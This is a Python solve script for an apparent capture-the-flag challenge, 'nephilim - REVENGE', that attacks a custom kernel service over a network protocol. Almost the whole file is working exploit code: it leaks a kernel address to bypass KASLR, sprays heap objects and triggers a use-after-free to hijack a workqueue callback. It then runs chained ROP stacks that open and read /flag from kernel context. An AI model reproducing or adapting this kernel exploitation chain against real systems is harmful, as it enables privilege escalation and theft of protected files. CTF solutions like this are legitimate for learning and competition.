#!/usr/bin/env python3
"""nephilim - REVENGE: nkrcu snap UAF + nkmon workqueue hijack.

Usage:
    python3 solve.py HOST PORT
"""
import socket
import struct
import sys
import time

VMLINUX_PRINTK = 0xFFFFFFFF8195C929
POP_RDI = 0xFFFFFFFF815D1A7B
POP_RSI = 0xFFFFFFFF81020F02
POP_RDX = 0xFFFFFFFF8100AC12
POP_RCX = 0xFFFFFFFF8171F3C3
POP_RSP = 0xFFFFFFFF81120EB5
MOV_RDI_RAX = 0xFFFFFFFF8199B6DB
FILP_OPEN = 0xFFFFFFFF8122AD40
KERNEL_READ = 0xFFFFFFFF8122D220
MSLEEP = 0xFFFFFFFF810FDDA0


def build_packet(cmd, seq, payload):
    hdr = b"NKTP" + struct.pack(">BBHH", 1, cmd, seq, len(payload)) + b"\x00\x00"
    return hdr + payload


def parse_response(data):
    if len(data) < 12 or data[:4] != b"NKTP":
        raise ValueError(f"bad NKTP packet: {data[:32]!r}")
    _ver, _cmd, _seq, length, _chk = struct.unpack(">BBHHH", data[4:12])
    return data[12 : 12 + length]


class NKTPClient:
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(15)
        self.s.connect((host, port))
        self.seq = 1

    def send_recv(self, cmd, payload):
        self.s.sendall(build_packet(cmd, self.seq, payload))
        self.seq += 1
        return parse_response(self.s.recv(1024))

    def create(self, arg=0):
        res = self.send_recv(1, struct.pack("<Q", arg))
        return struct.unpack("<QQ", res)

    def remove(self, desc_id):
        return struct.unpack("<i", self.send_recv(2, struct.pack("<Q", desc_id)))[0]

    def snap_create(self, desc_id):
        return struct.unpack("<Q", self.send_recv(3, struct.pack("<Q", desc_id)))[0]

    def info(self, desc_id):
        return struct.unpack("<5Q", self.send_recv(4, struct.pack("<Q", desc_id)))

    def spray_alloc(self, data):
        if len(data) != 128:
            raise ValueError("spray payload must be 128 bytes")
        res = self.send_recv(5, data)
        if len(res) != 8:
            raise RuntimeError(f"spray_alloc failed: {res!r}")
        return struct.unpack("<Q", res)[0]

    def sync(self):
        return struct.unpack("<i", self.send_recv(7, b""))[0]


def pack_gadgets(gadgets):
    buf = bytearray(128)
    for i, g in enumerate(gadgets[:16]):
        struct.pack_into("<Q", buf, i * 8, g)
    return bytes(buf)


def exploit(host, port):
    client = NKTPClient(host, port)
    targets = [client.create(i) for i in (111, 222, 333)]
    for i, (did, addr) in enumerate(targets):
        print(f"[+] desc{i} id={did} @ {hex(addr)}")

    fields = client.info(targets[0][0])
    kaslr = fields[3] - VMLINUX_PRINTK
    pivot = fields[4]
    print(f"[+] kaslr={hex(kaslr)} pivot={hex(pivot)}")

    pop_rdi = POP_RDI + kaslr
    pop_rsi = POP_RSI + kaslr
    pop_rdx = POP_RDX + kaslr
    pop_rcx = POP_RCX + kaslr
    pop_rsp = POP_RSP + kaslr
    mov_rdi_rax = MOV_RDI_RAX + kaslr
    filp_open = FILP_OPEN + kaslr
    kernel_read = KERNEL_READ + kaslr
    msleep = MSLEEP + kaslr

    dummy = b"\x00" * 128
    sprays = []

    def spray(data, label=None):
        addr = client.spray_alloc(data)
        sprays.append(addr)
        if label:
            print(f"[+] {label} {hex(addr)} n={len(sprays)}")
        return addr

    def pad(n=8):
        for _ in range(n):
            spray(dummy)

    data = bytearray(128)
    data[0:8] = b"/flag\x00\x00\x00"
    struct.pack_into("<Q", data, 0x10, 0)
    struct.pack_into("<Q", data, 0x18, 32)
    struct.pack_into("<Q", data, 0x20, 64)
    addr_d = spray(bytes(data), "D")

    # Build ROP stacks from the last read backwards so each stage can pivot up.
    pad(8)
    addr_h = spray(
        pack_gadgets(
            [
                pop_rsi,
                targets[2][1] + 8,
                pop_rdx,
                32,
                pop_rcx,
                addr_d + 0x20,
                kernel_read,
                pop_rdi,
                10000000,
                msleep,
                msleep,
            ]
        ),
        "H",
    )
    pad(8)
    addr_g = spray(
        pack_gadgets(
            [
                pop_rdi,
                addr_d,
                pop_rsi,
                0,
                filp_open,
                pop_rcx,
                0,
                mov_rdi_rax,
                pop_rsp,
                addr_h,
            ]
        ),
        "G",
    )
    pad(8)
    addr_f = spray(
        pack_gadgets(
            [
                pop_rsi,
                targets[1][1] + 8,
                pop_rdx,
                32,
                pop_rcx,
                addr_d + 0x18,
                kernel_read,
                pop_rsp,
                addr_g,
            ]
        ),
        "F",
    )
    pad(8)
    addr_e = spray(
        pack_gadgets(
            [
                pop_rdi,
                addr_d,
                pop_rsi,
                0,
                filp_open,
                pop_rcx,
                0,
                mov_rdi_rax,
                pop_rsp,
                addr_f,
            ]
        ),
        "E",
    )
    pad(8)
    addr_c = spray(
        pack_gadgets(
            [
                pop_rsi,
                targets[0][1] + 8,
                pop_rdx,
                32,
                pop_rcx,
                addr_d + 0x10,
                kernel_read,
                pop_rsp,
                addr_e,
            ]
        ),
        "C",
    )
    pad(8)
    addr_b = spray(
        pack_gadgets(
            [
                pop_rdi,
                addr_d,
                pop_rsi,
                0,
                filp_open,
                pop_rcx,
                0,
                mov_rdi_rax,
                pop_rsp,
                addr_c,
            ]
        ),
        "B",
    )

    pad(4)
    uaf_id, uaf_addr = client.create(999)
    print(f"[+] uaf id={uaf_id} @ {hex(uaf_addr)}")
    client.snap_create(uaf_id)
    client.remove(uaf_id)
    client.sync()

    fake = bytearray(128)
    struct.pack_into("<Q", fake, 0x00, uaf_addr + 0x20)
    struct.pack_into("<Q", fake, 0x10, uaf_addr + 0x18)
    struct.pack_into("<Q", fake, 0x18, pivot)
    struct.pack_into("<Q", fake, 0x20, pop_rsp)
    struct.pack_into("<Q", fake, 0x28, addr_b)
    reclaimed = spray(bytes(fake), "A")
    print(f"[+] reclaimed {hex(reclaimed)} match={reclaimed == uaf_addr}")
    if reclaimed != uaf_addr:
        raise RuntimeError("failed to reclaim UAF descriptor")

    print("[*] waiting for nkmon (5s timer)")
    time.sleep(7)

    parts = []
    for i, (did, _addr) in enumerate(targets):
        info = client.info(did)
        raw = struct.pack("<4Q", info[1], info[2], info[3], info[4])
        print(f"[+] part{i}: {raw!r}")
        parts.append(raw)

    flag = b"".join(parts).split(b"\x00")[0].split(b"\n")[0].decode("latin1", "ignore")
    print(f"FLAG {flag}")
    return flag


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} HOST PORT", file=sys.stderr)
        sys.exit(2)
    exploit(sys.argv[1], int(sys.argv[2]))
